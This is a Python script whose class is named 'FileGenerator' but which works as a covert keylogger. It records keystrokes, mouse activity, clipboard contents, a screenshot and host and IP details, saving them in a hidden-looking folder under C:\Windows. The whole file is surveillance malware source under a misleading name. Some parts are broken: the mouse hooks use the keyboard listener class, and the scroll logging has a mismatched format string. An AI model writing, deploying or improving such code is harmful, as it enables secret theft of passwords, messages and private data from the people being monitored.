import logging
import os
import platform
import socket
import time
import pyscreenshot
import pyperclip
from pynput import keyboard
from pynput.keyboard import Listener
import threading

# Shared settings
output_directory = "C:\\Windows\\klm\\output"
log_directory = "C:\\Windows\\klm\\logs"
logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class FileGenerator:
    def __init__(self):
        self.log = "File Generation Started..."
        logging.info("FileGenerator initialized")

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        try:
            current_move = "Mouse moved to {} {}\n".format(x, y)
            self.appendlog(current_move)
        except Exception as e:
            logging.error(f"Failed to log mouse movement: {e}")

    def on_click(self, x, y, button, pressed):
        try:
            current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
            self.appendlog(current_click)
        except Exception as e:
            logging.error(f"Failed to log mouse click: {e}")

    def on_scroll(self, x, y, dx, dy):
        try:
            current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
            self.appendlog(current_scroll)
        except Exception as e:
            logging.error(f"Failed to log mouse scroll: {e}")

    def save_data(self, key):
        try:
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "
            self.appendlog(current_key + "\n")
            self.save_log()
        except Exception as e:
            logging.error(f"Failed to log key press: {e}")

    def save_log(self):
        try:
            log_path = os.path.join(output_directory, "key_log.txt")
            with open(log_path, 'w') as log_file:
                log_file.write(self.log)
            logging.info(f"Key log saved to {log_path}")
        except Exception as e:
            logging.error(f"Failed to save log file: {e}")

    def get_clipboard_content(self, max_retries=5):
        clipboard_content = "Could not access clipboard"
        for i in range(max_retries):
            try:
                clipboard_content = pyperclip.paste()
                break
            except pyperclip.PyperclipException as e:
                logging.error(f"Error accessing clipboard (attempt {i+1}): {e}")
                time.sleep(1)  # Wait a bit before retrying
        self.appendlog(f"Clipboard content: {clipboard_content}\n")

    def system_information(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(f"Hostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")
            self.save_log()
        except Exception as e:
            logging.error(f"Failed to gather system information: {e}")

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            timestamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
            screenshot_path = os.path.join(output_directory, f"screenshot_{timestamp}.png")
            img.save(screenshot_path)
            logging.info(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            logging.error(f"Failed to take screenshot: {e}")

    def run(self):
        # Schedule periodic tasks or use threads as needed
        self.system_information()
        self.screenshot()
        threading.Thread(target=self.get_clipboard_content).start()

        # Start the keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()

        # Set up mouse listeners
        mouse_listener = Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
        mouse_listener.start()

if __name__ == "__main__":
    file_generator = FileGenerator()
    file_generator.run()
